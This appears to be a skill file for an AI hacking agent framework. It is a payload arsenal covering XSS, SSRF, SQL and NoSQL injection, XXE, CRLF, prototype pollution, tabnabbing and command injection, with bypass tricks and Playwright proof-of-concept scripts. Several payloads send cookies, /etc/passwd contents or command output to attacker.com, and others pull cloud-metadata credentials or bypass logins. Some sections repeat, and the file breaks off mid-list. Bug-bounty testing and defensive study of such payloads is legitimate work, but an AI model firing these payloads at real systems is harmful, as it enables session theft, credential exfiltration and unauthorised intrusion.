---
name: arsenal
description: >
  Security payloads, bypass tables, wordlists, gf pattern names, always-rejected
  bug list, and conditionally-valid-with-chain table. Use when you need specific
  payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/
  HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding
  is submittable.
license: MIT
compatibility: opencode>=1.5.0
metadata:
  framework: agentichack
  version: "1.0.0"
  tags: "agentichack,arsenal,payloads,bypass,wordlists"
  allowed-tools: "read"
---

# Security Arsenal

Payloads, bypass tables, wordlists, and submission rules.

---

## XSS PAYLOADS

### Basic Probes
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie Theft (Proof of Impact)
```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP Bypass Techniques
```javascript
// If unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// If script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

// Angular template injection (bypasses many CSPs)
{{constructor.constructor('alert(1)')()}}

// mXSS (mutation-based XSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot (works in HTML/JS/CSS context)
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

### DOM XSS Sources and Sinks
```javascript
// Sources (user-controlled input)
location.hash
location.search
location.href
document.referrer
window.name
document.URL

// Sinks (dangerous)
innerHTML = SOURCE
outerHTML = SOURCE
document.write(SOURCE)
eval(SOURCE)
setTimeout(SOURCE, ...)   // string form
setInterval(SOURCE, ...)
new Function(SOURCE)
element.src = SOURCE      // javascript: URI
element.href = SOURCE
location.href = SOURCE
```

---

## SSRF PAYLOADS

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379      # Redis (unauthenticated, RESP protocol)
http://localhost:9200      # Elasticsearch (/_cat/indices)
http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
http://localhost:8080      # Admin panel
http://localhost:2375      # Docker API — GET /containers/json
http://localhost:10.96.0.1:443  # Kubernetes API server
```

### SSRF IP Bypass Payloads
```bash
# All of these map to 127.0.0.1:
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:0x7f000001] # mixed hex IPv6

# DNS rebinding: A→external, then resolves to internal after allowlist check

# Redirect chain (Vercel pattern):
# If filter only checks initial URL but follows redirects:
http://allowed-domain.com/redirect?to=http://169.254.169.254/
```

---

## SQL INJECTION PAYLOADS

### Detection
```sql
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
'; SELECT SLEEP(5)--          -- MySQL time-based
' OR SLEEP(5)--
```

### Union-Based (Determine Column Count)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### Fingerprint + Prove Readable Data (Read-Only PoC)
```sql
-- pick DBMS by stack: .asp/IIS→MSSQL, .php→MySQL, Java/Python→PG/Oracle
-- column count first:  ' ORDER BY 1--  ↑ until error = N-1 cols
0' UNION SELECT NULL,'MARKER',NULL--               -- find a displayable column
-- fingerprint + identity (ONE readable value = valid finding):
0' UNION SELECT NULL,@@version,NULL--              -- MSSQL/MySQL
0' UNION SELECT NULL,version(),NULL--              -- PostgreSQL
0' UNION SELECT NULL,SYSTEM_USER,NULL--            -- MSSQL (current_user / USER() elsewhere)
-- schema walk + one-request dump of a sensitive table:
0' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES--   -- MySQL/MSSQL/PG (Oracle: ALL_TABLES)
-- MySQL GROUP_CONCAT() · MSSQL/PG STRING_AGG() · Oracle LISTAGG()  → dump in one request
```
Reading a credentials/config table is a valid standalone finding — submit on data, not a 500. (DB→OS escalation only if the DB user is sysadmin/superuser AND host exec is in scope.)

### Blind SQLi (Time-Based Confirmation)
```sql
# MySQL
' AND SLEEP(5)--
# PostgreSQL
' AND pg_sleep(5)--
# MSSQL
'; WAITFOR DELAY '0:0:5'--
# Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### WAF Bypass
```sql
/*!50000 SELECT*/ * FROM users     -- MySQL inline comment
SE/**/LECT * FROM users             -- comment injection
SeLeCt * FrOm uSeRs                -- case variation
%27 OR %271%27=%271                 -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                       -- Unicode apostrophe
```

---

## XXE PAYLOADS

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB via HTTP (DNS Confirmation)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### Blind OOB via DNS + Data Exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

### XXE via DOCX/SVG/PDF Upload
- SVG: `<image href="file:///etc/passwd" />`
- DOCX: malicious XML in `word/document.xml` with external entity

---

## PATH TRAVERSAL PAYLOADS

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
/etc/passwd%00.jpg                     # null byte truncation
....\/....\/etc/passwd                 # mix of separators
```

---

## IDOR / AUTH BYPASS PAYLOADS

### Horizontal Privilege Escalation
```bash
# Change numeric ID
GET /api/user/123/profile → GET /api/user/124/profile

# Change UUID (find victim UUID via other endpoints)
GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...

# HTTP method swap
PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)

# Old API version
GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)

# Add parameter
GET /api/orders → GET /api/orders?user_id=456
```

### Vertical Privilege Escalation
```bash
# Parameter pollution
POST /api/user/update
{"role": "admin"}
{"isAdmin": true}
{"admin": 1}

# Hidden fields
<input type="hidden" name="admin" value="true">
# Change in Burp before sending

# GraphQL introspection → find admin mutations
{"query": "{ __schema { types { name fields { name } } } }"}
```

---

## AUTHENTICATION BYPASS PAYLOADS

### JWT Attacks
```bash
# None algorithm
# Decode JWT, change alg to "none", remove signature
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

### OAuth Attacks
```bash
# Missing PKCE test
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# No code_challenge → check if 302 (not error) = PKCE not enforced

# State parameter check
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# Missing/static state parameter = CSRF on OAuth = account linkage attack
```

---

## CORS MISCONFIGURATION PAYLOADS

### Basic Origin Tests (via Caido)

```bash
# All via Caido proxy: curl -x "http://localhost:8080" ...

# 1. Arbitrary origin reflection
-H "Origin: https://attacker.example"

# 2. Null origin
-H "Origin: null"

# 3. HTTP origin on HTTPS API
-H "Origin: http://target.com"

# 4. Subdomain trust
-H "Origin: https://sub.target.com"

# 5. Suffix confusion (server-side parser test)
-H "Origin: https://target.com.attacker.example"

# 6. Prefix confusion
-H "Origin: https://target-example.com"

# 7. Case variation
-H "Origin: https://TARGET.COM"

# 8. Trailing dot
-H "Origin: https://target.com."

# 9. Default port explicit
-H "Origin: https://target.com:443"

# 10. User-info confusion
-H "Origin: https://target.com@attacker.example"
```

### Preflight Test

```bash
curl -x "http://localhost:8080" -i -X OPTIONS \
  -H "Origin: https://attacker.example" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: authorization,content-type" \
  https://target.com/api/profile
```

### Credentialed Test

```bash
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" \
  -H "Cookie: session=TEST_ACCOUNT_SESSION" \
  https://target.com/api/profile
```

### Origin Parser Differential Payloads

```bash
# Case variations
https://TARGET.COM
https://Target.Example

# Trailing dots
https://target.com.
https://target.com..

# Port variations
https://target.com:443
https://target.com:444
https://target.com:0443

# Prefix/suffix confusion
https://target.com.attacker.example
https://attacker.example.target.com
https://target-example.com
https://target.example%2eattacker.example

# User-info
https://target.com@attacker.example
https://target.com:pass@attacker.example

# IPv6
https://[::1]
https://[::ffff:127.0.0.1]

# IDN / Homograph
https://target.exаmple (Cyrillic а)
```

### Vulnerable Response Patterns

```http
# Credentialed CORS (Critical)
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true

# Wildcard (no credentials)
Access-Control-Allow-Origin: *

# Null origin trust
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Expose sensitive headers
Access-Control-Expose-Headers: X-Auth-Token, Authorization
```

### Browser Validation (Playwright)

```javascript
// cors-poc.js
const { chromium, firefox, webkit } = require('playwright');

async function test(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  await page.goto('https://target.com/login');
  await page.fill('input[name="email"]', process.env.TEST_EMAIL);
  await page.fill('input[name="password"]', process.env.TEST_PASS);
  await page.click('button[type="submit"]');
  await page.waitForURL('**/dashboard');

  await page.goto('https://attacker.example/cors-poc.html');
  const result = await page.evaluate(() => window.__corsResult);

  console.log(name, '=>', JSON.stringify(result));
  await browser.close();
}

(async () => {
  await test(chromium, 'Chromium');
  await test(firefox, 'Firefox');
  await test(webkit, 'WebKit');
})();
```

### Attacker PoC Page (cors-poc.html)

```html
<script>
window.__corsResult = null;
fetch("https://target.com/api/profile", { credentials: "include" })
  .then(r => r.text().then(b => window.__corsResult = { ok: true, status: r.status, body: b }))
  .catch(e => window.__corsResult = { ok: false, error: String(e) });
</script>
```

### Quick-Kill Fingerprints

```bash
# Test these response patterns
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true

# Combined with sensitive endpoint = confirmed
```

### Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| CORS + sensitive API | Direct | High/Critical |
| CORS + IDOR | IDOR | Critical |
| CORS + XSS on subdomain | XSS | Critical |
| CORS + subdomain takeover | Takeover | Critical |
| CORS + token in Expose-Headers | Token theft | High |

---

## CRLF INJECTION PAYLOADS

### Basic CRLF Payloads (via Caido)

```bash
# All via Caido proxy: curl -x "http://localhost:8080" ...

# Basic CRLF injection
%0D%0A

# Double CRLF (response splitting)
%0D%0A%0D%0A

# Double encoded
%250D%250A

# Triple encoded
%25250D%25250A

# Literal CR/LF (if input allows)
%0D%0A

# Double CRLF
%0D%0A%0D%0A
```

### Header Injection Payloads

```bash
# Inject custom header
%0D%0AX-Injected%3A%20true

# Inject multiple headers
%0D%0AX-Header1%3A%20value1%0D%0AX-Header2%3A%20value2

# Overwrite existing header
%0D%0ALocation%3A%20https%3A%2F%2Fattacker.example

# Cookie injection
%0D%0ASet-Cookie%3A%20session%3Dhacked%3B%20HttpOnly

# Content-Type manipulation
%0D%0AContent-Type%3A%20text%2Fhtml
```

### Response Splitting Payloads

```bash
# Full response splitting
%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C%2Fscript%3E

# With custom status
%0D%0A%0D%0AHTTP%2F1.1%20302%20Found%0D%0ALocation%3A%20https%3A%2F%2Fattacker.example%0D%0A%0D%0A

# Cache poisoning via splitting
%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20application%2Fjson%0D%0A%0D%0A%7B%22injected%22%3Atrue%7D
```

### SMTP/Email Header Injection

```bash
# Bcc injection
%0D%0ABcc%3A%20attacker%40example.com

# To injection
%0D%0ATo%3A%20attacker%40example.com

# Subject injection
%0D%0ASubject%3A%20Hacked

# From injection
%0D%0AFrom%3A%20attacker%40example.com

# Multiple headers
%0D%0ABcc%3A%20attacker%40example.com%0D%0ATo%3A%20victim%40example.com
```

### MIME/Content-Disposition Injection

```bash
# Filename injection
%0D%0AX-Injected%3A%20true

# Content-Type injection
%0D%0AContent-Type%3A%20text%2Fhtml

# Filename with path traversal
..%0D%0A..%0D%0Aetc%0D%0Apasswd
```

### SSE (Server-Sent Events) Injection

```bash
# Event field injection
%0D%0Aevent%3A%20injected

# Data field injection
%0D%0Adata%3A%20injected

# ID field injection
%0D%0Aid%3A%20injected

# Retry field injection
%0D%0Aretry%3A%201000

# Comment injection
%0D%0A%3A%20injected%20comment
```

### Encoding Depth Payloads

```bash
# Single URL decode
%0D%0A

# Double URL decode
%250D%250A

# Triple URL decode
%25250D%25250A

# Mixed encoding
%0D%250A
%250D%0A

# Unicode/UTF-8 variations
%0D%0A
%0D%0A
```

### Origin Parser Differential Payloads

```bash
# Case variations
https://TARGET.COM
https://Target.Example

# Trailing dots
https://target.com.
https://target.com..

# Port variations
https://target.com:443
https://target.com:444
https://target.com:0443

# Prefix/suffix confusion
https://target.com.attacker.example
https://attacker.example.target.com
https://target-example.com
https://target.example%2eattacker.example

# User-info
https://target.com@attacker.example
https://target.com:pass@attacker.example

# IPv6
https://[::1]
https://[::ffff:127.0.0.1]

# IDN / Homograph
https://target.exаmple (Cyrillic а)
```

### Vulnerable Response Patterns

```http
# Header injection confirmed
HTTP/1.1 302 Found
Location: https://attacker.example
X-Injected: true          # ← Independent header!

# Response splitting confirmed
HTTP/1.1 302 Found
Location: https://attacker.example

HTTP/1.1 200 OK           # ← Second response!
Content-Type: text/html

<script>alert(1)</script>

# Cookie injection confirmed
HTTP/1.1 200 OK
Set-Cookie: session=test
Set-Cookie: hacked=true; HttpOnly  # ← Injected cookie!

# SMTP injection confirmed
Received: from target.com
Bcc: attacker@example.com        # ← Injected Bcc!
```

### Browser Validation (Playwright)

```javascript
// crlf-validation.js
const { chromium, firefox, webkit } = require('playwright');

async function test(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // Test redirect with CRLF injection
  const response = await page.goto('https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true');
  
  // Check for injected header
  const headers = response.headers();
  const injected = headers['x-injected'] === 'true';
  
  console.log(`${name}: Injected header = ${injected}`);
  await browser.close();
  return injected;
}

(async () => {
  await test(chromium, 'Chromium');
  await test(firefox, 'Firefox');
  await test(webkit, 'WebKit');
})();
```

### Attacker PoC Page (crlf-poc.html)

```html
<!DOCTYPE html>
<html>
<head><title>CRLF Validation</title></head>
<body>
  <h2>CRLF Injection Validation</h2>
  <pre id="result">Testing...</pre>
  <script>
    window.__crlfResult = null;
    fetch("https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true", { credentials: "include" })
      .then(r => {
        const headers = {};
        r.headers.forEach((v, k) => headers[k] = v);
        window.__crlfResult = { 
          ok: true, 
          status: r.status, 
          headers: headers,
          injected: headers['x-injected'] === 'true'
        };
        document.getElementById("result").textContent = JSON.stringify(headers, null, 2);
      })
      .catch(e => window.__crlfResult = { ok: false, error: String(e) });
  </script>
</body>
</html>
```

### Quick-Kill Fingerprints

```bash
# Test these response patterns
X-Injected: true
Set-Cookie: hacked=true
Location: https://attacker.example
Content-Type: text/html
```

### Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| Header injection → Cookie theft | `Set-Cookie` injection + session fixation | High |
| Header injection → Open redirect | `Location` injection + redirect control | High |
| Header injection → XSS | `Content-Type: text/html` + body injection | Critical |
| Header injection → Response splitting | Double CRLF → second response | Critical |
| Header injection → Cache poisoning | `Vary` manipulation + shared cache | High |
| Header injection → Request smuggling | `Transfer-Encoding` + `Content-Length` | Critical |
| SMTP injection → Email hijack | `Bcc`/`To` injection | High |
| SSE injection → Event forgery | `event`/`data` field injection | Medium |
| Log injection → Log forging | SIEM/log consumer interpretation | Medium |

---

## TABNABBING & REVERSE TABNABBING PAYLOADS

### HTML Anchor Payloads

```html
<!-- Basic reverse tabnabbing -->
<a href="https://attacker.example" target="_blank">Click me</a>

<!-- Explicit opener request -->
<a href="https://attacker.example" target="_blank" rel="opener">Click me</a>

<!-- User-controlled destination (stored XSS vector) -->
<a href="javascript:window.opener.location='https://phishing.example'" target="_blank">Click</a>

<!-- With explicit opener -->
<a href="https://attacker.example" target="_blank" rel="opener">Open</a>

<!-- Without noopener (vulnerable in older browsers) -->
<a href="https://attacker.example" target="_blank">Open</a>
```

### JavaScript window.open Payloads

```javascript
// Basic vulnerable pattern
window.open(userControlledUrl, "_blank");

// Explicit opener request
window.open(url, "_blank", "opener");

// Multiple features without noopener
window.open(url, "_blank", "width=800,height=600");

// Named browsing context (allows cross-tab communication)
window.open(url, "sharedWindow");

// Post-exploitation: navigate opener
window.opener.location.href = "https://phishing.example/login";

// Stealth navigation
window.opener.location.assign("https://phishing.example");
window.opener.location.replace("https://phishing.example");
```

### Child Page Exploitation Payloads

```html
<!-- Child page: check opener relationship -->
<script>
if (window.opener !== null) {
    console.log('Opener exists:', window.opener.location.origin);
}
</script>

<!-- Child page: navigate opener (phishing) -->
<script>
if (window.opener !== null) {
    window.opener.location.href = 'https://phishing.example/login';
}
</script>

<!-- Child page: steal data via opener -->
<script>
if (window.opener !== null) {
    // Access opener's DOM (same-origin only)
    // Cross-origin: limited to navigation
    window.opener.postMessage({type: 'steal', data: document.cookie}, '*');
}
</script>

<!-- Child page: close opener tab -->
<script>
if (window.opener !== null) {
    window.opener.close();
}
</script>

<!-- Child page: opener XSS (same-origin) -->
<script>
if (window.opener !== null) {
    window.opener.document.body.innerHTML = '<img src=x onerror=alert(1)>';
}
</script>

<!-- Traditional tabnabbing: delayed content change -->
<script>
setTimeout(() => {
    document.title = 'Login - Trusted Bank';
    document.body.innerHTML = '<form>...phishing form...</form>';
    // Change favicon
    document.querySelector("link[rel='icon']").href = 'https://bank.example/favicon.ico';
}, 30000); // 30 seconds delay
</script>
```

### Detection & Validation Payloads

```javascript
// Playwright validation: check opener
const openerCheck = await popup.evaluate(() => ({
    openerNull: window.opener === null,
    openerOrigin: window.opener ? window.opener.location.origin : null
}));

// Test navigation capability
await popup.evaluate(() => {
    window.opener.location.href = 'https://test-owned.example/tabnabbing-marker';
});

// Monitor traditional tabnabbing
new MutationObserver(mutations => {
    for (const m of mutations) {
        if (m.type === 'childList' || m.type === 'characterData') {
            console.log('Content changed in background tab');
        }
    }
}).observe(document.body, { childList: true, subtree: true, characterData: true });

// Visibility API for traditional tabnabbing
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
        console.log('Tab visible:', document.title, location.href);
    }
});

// Check opener in console
window.opener === null
window.opener?.location?.origin
window.opener?.location?.href
```

### Secure Patterns (Remediation)

```html
<!-- Always use noopener noreferrer for external links -->
<a href="https://external.example" 
   target="_blank" 
   rel="noopener noreferrer">
   External Link
</a>

<!-- JavaScript with proper isolation -->
const popup = window.open(url, "_blank", "noopener,noreferrer");

<!-- Never use rel="opener" unless explicitly required -->
<!-- If opener needed, validate destination is trusted -->
```

### Quick-Kill Fingerprints

```bash
# Test these response patterns
# Vulnerable: window.opener !== null in popup
# Vulnerable: navigation succeeds in opener
# Vulnerable: postMessage received from child

# Test in browser console:
window.open('https://attacker.example', '_blank')
// Then in popup console: window.opener !== null
```

### Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| Reverse tabnabbing + phishing page | Credential theft | High |
| Reverse tabnabbing + open redirect | Silent redirect | Medium |
| Reverse tabnabbing + XSS on child | Full compromise | Critical |
| Traditional tabnabbing + session | Session hijacking | Medium |
| Tabnabbing + OAuth flow | Account takeover | High |

---

## PROTOTYPE POLLUTION PAYLOADS

### Server-Side Payloads (JSON Body)

```json
// json spaces oracle (Express < 4.18.0)
{"__proto__":{"json spaces":10}}

// status code override
{"__proto__":{"status":418}}

// charset override
{"__proto__":{"charset":"utf-7"}}

// exposedHeaders override
{"__proto__":{"exposedHeaders":"x-custom-header"}}

// Generic pollution
{"__proto__":{"polluted":"NSPROOF"}}

// Constructor prototype path
{"constructor":{"prototype":{"polluted":"NSPROOF"}}}

// Nested pollution
{"user":{"__proto__":{"admin":true}}}

// Array pollution
{"items":[{"__proto__":{"polluted":"NSPROOF"}}]}
```

### Query String Payloads

```bash
# Basic prototype pollution
?__proto__[polluted]=NSPROOF

# Constructor prototype path
?constructor.prototype.polluted=NSPROOF

# Nested pollution
?user[__proto__][admin]=true

# Array pollution
?items[0][__proto__][polluted]=NSPROOF

# Constructor prototype nested
?constructor[prototype][polluted]=NSPROOF

# Deep nesting
?a[b][c][__proto__][polluted]=NSPROOF
```

### URL Fragment Payloads (Client-Side)

```bash
# Fragment-based (client-side routers)
#__proto__[polluted]=NSPROOF
#constructor.prototype.polluted=NSPROOF
```

### postMessage Payloads (Client-Side)

```javascript
// Basic pollution
postMessage({"__proto__":{"polluted":"NSPROOF"}}, "*")

// Nested
postMessage({"config":{"__proto__":{"admin":true}}}, "*")

// With origin targeting
window.parent.postMessage({"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}, "*")
```

### File Upload Payloads (YAML/JSON)

```yaml
# YAML file upload
__proto__:
  polluted: "NSPROOF"
  admin: true

# JSON file upload
{
  "__proto__": {
    "polluted": "NSPROOF",
    "admin": true
  }
}
```

### GraphQL Payloads

```graphql
# Variable with prototype pollution
mutation UpdateSettings($input: SettingsInput!) {
  updateSettings(input: $input) { success }
}

# Variables
{
  "input": {
    "__proto__": {
      "polluted": "NSPROOF",
      "admin": true
    }
  }
}
```

### Client-Side Detection (Playwright)

```javascript
// prototype-pollution-detection.js
const { chromium, firefox, webkit } = require('playwright');

const TARGET = 'https://target.com/';
const TEST_PAYLOADS = [
  '?__proto__[polluted]=NSPROOF',
  '?constructor.prototype.polluted=NSPROOF',
  '#__proto__[polluted]=NSPROOF'
];

async function testBrowser(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  console.log(`\n=== ${name} ===`);

  for (const payload of TEST_PAYLOADS) {
    await page.goto(TARGET + payload);
    await page.waitForLoadState('networkidle');

    const polluted = await page.evaluate(() => {
      const fresh = {};
      return Object.prototype.polluted === 'NSPROOF' || 
             fresh.polluted === 'NSPROOF';
    });

    console.log(`  ${payload}: ${polluted ? 'POLLUTED' : 'clean'}`);
  }

  await browser.close();
}

(async () => {
  await testBrowser(chromium, 'Chromium');
  await testBrowser(firefox, 'Firefox');
  await testBrowser(webkit, 'WebKit');
})();
```

### Server-Side Detection Oracles

```bash
# json spaces oracle (Express < 4.18.0)
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":10}}' \
  "https://target.com/api/endpoint"

# Then check subsequent JSON responses for indentation
curl -x "http://localhost:8080" -s "https://target.com/api/endpoint" | python3 -m json.tool

# Status code oracle (Express 4.x)
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"status":418}}' \
  "https://target.com/api/endpoint"

# Then check subsequent responses for status 418
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/api/endpoint"

# Charset oracle
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"charset":"utf-7"}}' \
  "https://target.com/api/endpoint"

# ExposedHeaders oracle
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"exposedHeaders":"x-custom-header"}}' \
  "https://target.com/api/endpoint"
```

### Client-Side Validation (Playwright)

```javascript
// Full validation with gadget discovery
const { chromium, firefox, webkit } = require('playwright');

const TARGET = 'https://target.com/';
const TEST_PAYLOADS = [
  '?__proto__[polluted]=NSPROOF',
  '?constructor.prototype.polluted=NSPROOF',
  '#__proto__[polluted]=NSPROOF'
];

async function testBrowser(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  console.log(`\n=== ${name} ===`);

  for (const payload of TEST_PAYLOADS) {
    await page.goto(TARGET + payload);
    await page.waitForLoadState('networkidle');

    const polluted = await page.evaluate(() => {
      const fresh = {};
      return Object.prototype.polluted === 'NSPROOF' || 
             fresh.polluted === 'NSPROOF';
    });

    console.log(`  ${payload}: ${polluted ? 'POLLUTED' : 'clean'}`);
  }

  await browser.close();
}

(async () => {
  await testBrowser(chromium, 'Chromium');
  await testBrowser(firefox, 'Firefox');
  await testBrowser(webkit, 'WebKit');
})();
```

### Gadget Discovery

```javascript
// gadget-discovery.js
const { chromium } = require('playwright');

async function discoverGadgets() {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // Inject pollution
  await page.goto('https://target.com/#__proto__[polluted]=NSPROOF');
  await page.waitForLoadState('networkidle');

  // Discover gadgets
  const gadgets = await page.evaluate(() => {
    const results = {};
    
    // Check innerHTML sink
    const div = document.createElement('div');
    div.innerHTML = '<span>test</span>';
    results.innerHTML = div.innerHTML.includes('NSPROOF');
    
    // Check script src
    const script = document.createElement('script');
    script.src = 'https://example.com/test.js';
    results.scriptSrc = script.src.includes('NSPROOF');
    
    // Check location.href
    const a = document.createElement('a');
    a.href = 'https://example.com';
    results.href = a.href.includes('NSPROOF');
    
    // Check srcdoc
    const iframe = document.createElement('iframe');
    iframe.srcdoc = '<script>alert(1)</script>';
    results.srcdoc = iframe.srcdoc.includes('NSPROOF');
    
    // Check location.href
    results.locationHref = window.location.href.includes('NSPROOF');
    
    return results;
  });

  console.log('Gadgets found:', JSON.stringify(gadgets, null, 2));
  await browser.close();
}
```

### Quick-Kill Fingerprints

```bash
# Test these response patterns
# Vulnerable: window.Object.prototype.polluted === 'NSPROOF'
# Vulnerable: {} .polluted === 'NSPROOF'
# Vulnerable: Object.prototype.polluted === 'NSPROOF'

# Test in browser console:
# Object.prototype.polluted === 'NSPROOF'
# {} .polluted === 'NSPROOF'
# Object.prototype.polluted === 'NSPROOF'
```

### Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| Client PP + DOM XSS | PP → innerHTML/script.src | Critical |
| Client PP + Open Redirect | PP → location.href | High |
| Client PP + OAuth flow | PP → redirect → OAuth code theft | Critical |
| Server PP + JSON spaces | Indented JSON → info leak | Low |
| Server PP + Status override | Status code override → bypass | Medium |
| Server PP + Child Process | PP → spawn/fork options → RCE | Critical |
| Server PP + Template Engine | PP → template options → RCE | Critical |
| Server PP + FileSystem | PP → fs options → read/write | Critical |

---

## NOSQL INJECTION PAYLOADS (MongoDB)

### Operator Injection (JSON Body)
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
{"username": {"$in": ["admin", "root", "administrator"]}}
```

### GET Parameter Injection
```bash
# URL parameter injection
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
/login?username=admin&password[$gt]=

# MongoDB operator reference:
# $ne = not equal (bypass: value != null = any value matches)
# $gt = greater than (bypass: "" < any string)
# $regex = regex match (bypass: .* = anything)
# $where = JS expression (RCE potential on older MongoDB)
```

### Auth Bypass One-Liners
```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL-encoded for GET forms:
# username%5B%24ne%5D=null&password%5B%24ne%5D=null
```

---

## COMMAND INJECTION PAYLOADS

### Basic Detection
```bash
; id
| id
` id `
$(id)
&& id
|| id
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

### Blind OOB (Out-of-Band Confirmation)
```bash
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
`ping -c 1 attacker.burpcollaborator.net`
; wget https://attacker.com/$(id|base64)
```

### Bypass Techniques
```bash
# Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd

# Bypass keyword filter (cat, id blocked)
;c'a't /etc/passwd
;c"a"t /etc/passwd
